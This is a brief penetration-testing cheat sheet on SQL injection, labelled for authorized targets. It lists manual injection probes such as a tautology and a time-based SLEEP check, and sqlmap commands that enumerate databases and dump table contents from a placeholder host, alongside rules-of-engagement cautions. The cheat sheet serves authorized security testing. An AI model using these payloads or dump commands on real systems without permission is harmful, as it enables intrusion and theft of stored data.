# SQL Injection — Deep Dive (Authorized targets only)

## Manual probes (non-destructive)
'          # look for SQL errors
ORDER BY 1 -- -
' OR '1'='1' -- -
1 AND SLEEP(3)  # time-based check

## sqlmap quick usage (safe defaults)
sqlmap -u "http://<IP>/item.php?id=1" --batch --random-agent --level=1 --risk=1 -p id -o

## Authenticated targets / cookies
sqlmap -u "http://<IP>/item.php?id=1" --cookie="PHPSESSID=..." --batch -p id

## DB enumeration (when permitted)
# sqlmap --dbs
# sqlmap -D <db> --tables
# sqlmap -D <db> -T <table> --columns
# sqlmap -D <db> -T <table> --dump --stop=10

## Notes
- Keep --risk and --level conservative unless approved to increase.
- Stop immediately on instability; notify stakeholders if required by RoE.
